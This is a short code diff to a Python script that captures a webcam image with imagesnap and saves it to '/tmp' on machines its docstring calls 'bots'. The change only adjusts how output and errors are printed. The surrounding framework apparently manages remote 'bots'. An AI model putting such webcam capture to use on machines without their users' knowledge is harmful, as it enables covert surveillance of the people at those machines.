@@ -1,7 +1,7 @@
 import os
 import subprocess
-
 import datetime
+import sys
 
 '''Takes webcam image and saves image to bot's /tmp folder with a date-time stamp
     Note: installing brew may seem extreme, but ideally we would like all bots to end up with brew at some point'''
@@ -21,4 +21,5 @@ proc = subprocess.Popen(['imagesnap', '/tmp/image-{}.png'.format(datetime.dateti
                         stderr=subprocess.PIPE)
 (out, err) = proc.communicate()
 
-print(err if err else out)
+sys.stderr.write(err)
+sys.stdout.write(out)
